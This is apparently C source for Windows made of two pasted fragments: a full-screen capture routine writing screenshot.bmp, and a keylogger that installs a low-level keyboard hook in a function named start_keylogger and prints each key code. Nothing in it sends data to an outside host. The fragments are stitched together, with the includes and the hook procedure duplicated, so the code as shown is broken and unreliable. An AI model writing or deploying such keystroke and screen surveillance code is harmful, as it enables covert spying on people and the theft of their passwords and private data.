#include <windows.h>
#include <stdio.h>

void capture_screen() {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMemDC, hBitmap);
    BitBlt(hdcMemDC, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    BITMAPFILEHEADER bfh;
    BITMAPINFOHEADER bih;
    bfh.bfType = 0x4D42; // "BM"
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bfh.bfSize = bfh.bfOffBits + width * height * 3;

    bih.biSize = sizeof(BITMAPINFOHEADER);
    bih.biWidth = width;
    bih.biHeight = height;
    bih.biPlanes = 1;
    bih.biBitCount = 24;
    bih.biCompression = BI_RGB;

    FILE *f = fopen("screenshot.bmp", "wb");
    fwrite(&bfh, sizeof(BITMAPFILEHEADER), 1, f);
    fwrite(&bih, sizeof(BITMAPINFOHEADER), 1, f);
    unsigned char *buffer = (unsigned char *)malloc(width * height * 3);
    GetDIBits(hdcScreen, hBitmap, 0, height, buffer, (BITMAPINFO *)&bih, DIB_RGB_COLORS);
    fwrite(buffer, 1, width * height * 3, f);
    fclose(f);

    ReleaseDC(NULL, hdcScreen);
    DeleteDC(hdcMemDC);
    DeleteObject(hBitmap);
    free(buffer);
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN) {
            printf("Key pressed: %d\n", kbd->vkCode);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

#include <windows.h>
#include <stdio.h>

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN) {
            printf("Key pressed: %d\n", kbd->vkCode);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void start_keylogger() {
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hook == NULL) {
        printf("Failed to install hook\n");
        return;
    }
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hook);
}
